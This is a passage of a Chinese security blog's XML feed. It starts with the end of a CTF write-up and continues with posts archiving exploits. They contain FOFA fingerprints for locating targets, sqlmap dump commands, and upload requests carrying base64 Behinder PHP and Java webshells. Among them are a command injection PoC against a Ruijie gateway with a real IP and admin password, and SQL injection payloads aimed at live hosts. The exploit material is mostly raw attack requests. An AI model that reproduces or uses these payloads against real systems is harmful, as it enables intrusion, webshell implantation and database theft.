src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117104923898.png" alt="image-20241117104923898"></p><p>然后双击a3变量查看到回显的flag</p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117103603654.png" alt="image-20241117103603654"></p><h1 id="6-漏洞挖掘分析（PWN）-无"><a href="#6-漏洞挖掘分析（PWN）-无" class="headerlink" title="6.漏洞挖掘分析（PWN） 无"></a>6.漏洞挖掘分析（PWN） 无</h1>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>棋牌and菠菜漏洞2x</title>
    <link href="/2024/11/13/%E6%A3%8B%E7%89%8Cand%E8%8F%A0%E8%8F%9C%E6%BC%8F%E6%B4%9E2x/"/>
    <url>/2024/11/13/%E6%A3%8B%E7%89%8Cand%E8%8F%A0%E8%8F%9C%E6%BC%8F%E6%B4%9E2x/</url>
    
    <content type="html"><![CDATA[<p>棋牌：</p><h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">”<span class="hljs-regexp">/Content/im</span>ages/login_main.png”<br></code></pre></div></td></tr></table></figure><h2 id="登陆处存在POST注入"><a href="#登陆处存在POST注入" class="headerlink" title="登陆处存在POST注入"></a>登陆处存在POST注入</h2><p>抓包后丢到sqlmap跑就行了</p><p>SqlmapPayload：sqlmap.py -r -D RYPlatformManagerDB -T Base_Users -C Username,Password –dump</p><p>也可通过sqlmap的os-shell进行反弹cs</p><p>菠菜：</p><h2 id="fofa-1"><a href="#fofa-1" class="headerlink" title="fofa"></a>fofa</h2><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf"><span class="hljs-attribute">body</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;main.e5ee9b2df05fc2d310734b11cc8c911e.css&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="上传冰蝎马，返回上传路径"><a href="#上传冰蝎马，返回上传路径" class="headerlink" title="上传冰蝎马，返回上传路径"></a>上传冰蝎马，返回上传路径</h2><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">//statics/admin/webuploader/0.1.5/server/preview.php</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>&#123;&#123;Hostname&#125;&#125;<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Dnt</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">If-Modified-Since</span><span class="hljs-punctuation">: </span>Mon, 05 Sep 2022 01:19:50 GMT<br><span class="hljs-attribute">If-None-Match</span><span class="hljs-punctuation">: </span>&quot;63154eb6-273&quot;<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>746<br><br><span class="language-bash">data:image/php;<span class="hljs-built_in">base64</span>,PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IAoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/Pg==</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于锐捷NBR1700G-E网关存在命令执行漏洞</title>
    <link href="/2024/11/13/%E5%85%B3%E4%BA%8E%E9%94%90%E6%8D%B7NBR1700G-E%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/%E5%85%B3%E4%BA%8E%E9%94%90%E6%8D%B7NBR1700G-E%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><em><strong>*漏洞描述*</strong></em></p><p>锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。</p><p>锐捷NBR1700G-E网关存在命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。</p><p>本漏洞均为代码审计结果，所以不提供互联网案例，提供复现视频。</p><p>一、 漏洞影响</p><p>NBR1700G-E</p><p>二、 漏洞位置</p><p>&#x2F;itbox_pi&#x2F;vpn_quickset_service.php</p><p>三、 代码分析</p><p>$startIp参数可控，并且拼接带到 ` ` 中，造成命令执行。</p><p>五、漏洞复现</p><p><a href="https://110.90.121.57:4430/">https://110.90.121.57:4430</a></p><p>登录界面</p><p>admin&#x2F;Ry123.</p><p><img src="/2024/11/13/%E5%85%B3%E4%BA%8E%E9%94%90%E6%8D%B7NBR1700G-E%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/wps6.jpg" alt="img"></p><p><img src="/2024/11/13/%E5%85%B3%E4%BA%8E%E9%94%90%E6%8D%B7NBR1700G-E%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/wps7.jpg" alt="img"> </p><p>2.通过startIp参数可以直接执行命令，由于exec无回显，这里我们通过whoami测试，并写入到1.php中。</p><p>POC</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/itbox_pi/vpn_quickset_service.php?a=set_vpn</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>110.90.121.57:4430<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>LOCAL_LANG_COOKIE=zh; RUIJIEID=k7bb03flop42b3n3d0068r4p00; user=admin; helpKey=home_sys<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>28<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://110.90.121.57:4430<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://110.90.121.57:4430/itbox_pi<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-autohotkey">startIp=|echo `whoami`&gt;<span class="hljs-number">1</span>.php</span><br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/13/%E5%85%B3%E4%BA%8E%E9%94%90%E6%8D%B7NBR1700G-E%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/wps8.jpg" alt="img"> </p><p>3.访问&#x2F;itbox_pi&#x2F;1.php</p><p><img src="/2024/11/13/%E5%85%B3%E4%BA%8E%E9%94%90%E6%8D%B7NBR1700G-E%E7%BD%91%E5%85%B3%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/wps9.jpg" alt="img"> </p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>辰信景云终端安全管理系统 login SQL注入漏洞</title>
    <link href="/2024/11/13/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>POST &#x2F;api&#x2F;user&#x2F;login</p><p>captcha&#x3D;&amp;password&#x3D;21232f297a57a5a743894a0e4a801fc3&amp;username&#x3D;admin’and(select*from(select+sleep(3))a)&#x3D;’</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安美数字酒店宽带运营系统前台SQL注入漏洞guestinfo_reg.php</title>
    <link href="/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/"/>
    <url>/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/</url>
    
    <content type="html"><![CDATA[<p>&#x2F;user&#x2F;portal&#x2F;guestinfo_reg.php</p><p>通过GuestName参数注入获取当前数据库名</p><p>POC</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user/portal/guestinfo_reg.php?Query=GuestName&amp;GuestName=1\%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>218.94.5.34:7070<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>1.1.1.1<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br> <br></code></pre></div></td></tr></table></figure><p>成功获取到数据库名：<em><strong>*DB_HIBOS*</strong></em></p><p><img src="/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/wps5.jpg" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安美数字酒店宽带运营系统前台SQL注入漏洞get_passwd_policy.php</title>
    <link href="/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>一、 <strong>漏洞****位置</strong></p><p>&#x2F;user&#x2F;portal&#x2F;get_passwd_policy.php</p><p>通过$userid参数注入获取当前数据库名</p><p>POC</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user/portal/get_passwd_policy.php?userid=1\%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q&amp;passwd=2</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>218.94.5.34:7070<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>1.1.1.1<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></div></td></tr></table></figure><p>成功获取到数据库名：<em><strong>*DB_HIBOS*</strong></em></p><p><img src="/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/wps4.jpg" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PigCMS action_flashUpload 任意文件上传漏洞</title>
    <link href="/2024/11/13/PigCMS-action-flashUpload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/PigCMS-action-flashUpload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>app.name&#x3D;”PigCMS”</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cms/manage/admin.php?m=manage&amp;c=background&amp;a=action_flashUpload</span> <span class="hljs-meta">HTTP/1.1</span><br>Host:eb.sakuraeb.com<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----aaa<br><br><span class="language-php">------aaa</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;filePath&quot;</span>; filename=<span class="hljs-string">&quot;test.php&quot;</span></span><br><span class="language-php">Content-Type: video/x-flv</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------aaa</span><br></code></pre></div></td></tr></table></figure><p>路径<br>&#x2F;cms&#x2F;upload&#x2F;images&#x2F;2023&#x2F;08&#x2F;11&#x2F;1691722887xXbx.php</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LiveBos 文件上传漏洞</title>
    <link href="/2024/11/13/LiveBos-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/LiveBos-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/plug-in/common/ScriptVariable.jsp;.css.jsp</span> <span class="hljs-meta">HTTP/1.0</span><br>Host:&#123;&#123;IP:30002&#125;&#125; <br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close <br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6577 <br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36 <br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded <br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate <br><br><span class="language-xquery">act=put&amp;scope=<span class="hljs-number">0</span><span class="hljs-built_in">&amp;name</span>=gName13&amp;<span class="hljs-keyword">value</span>=content<span class="hljs-meta">%3Dorg</span>.apache.commons.codec.binary.StringUtils.newString<span class="hljs-meta">%28java</span><span class="hljs-built_in">.lang</span>.Class.forName<span class="hljs-meta">%28</span><span class="hljs-meta">%22org</span>.apache.commons.codec.binary.Base64<span class="hljs-meta">%22</span><span class="hljs-meta">%29</span>.newInstance<span class="hljs-meta">%28</span><span class="hljs-meta">%29</span>.decodeBase64<span class="hljs-meta">%28</span><span class="hljs-meta">%22PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%22</span><span class="hljs-meta">%29</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%22UTF-8</span><span class="hljs-meta">%22</span><span class="hljs-meta">%29</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%22</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3Bbytes</span><span class="hljs-meta">%3Djava</span><span class="hljs-built_in">.lang</span>.Class.forName<span class="hljs-meta">%28</span><span class="hljs-meta">%22org</span>.apache.commons.codec.binary.Base64<span class="hljs-meta">%22</span><span class="hljs-meta">%29</span>.newInstance<span class="hljs-meta">%28</span><span class="hljs-meta">%29</span>.decode<span class="hljs-meta">%28</span><span class="hljs-meta">%22yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB</span><span class="hljs-meta">%2FCgB</span><span class="hljs-meta">%2BAIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcv</span></span><br></code></pre></div></td></tr></table></figure><p>body&#x3D;”&#x2F;react&#x2F;browser&#x2F;loginBackground.png”</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-0713 Monitorr upload.php 上传漏洞</title>
    <link href="/2024/11/13/CVE-2024-0713-Monitorr-upload-php-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/CVE-2024-0713-Monitorr-upload-php-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
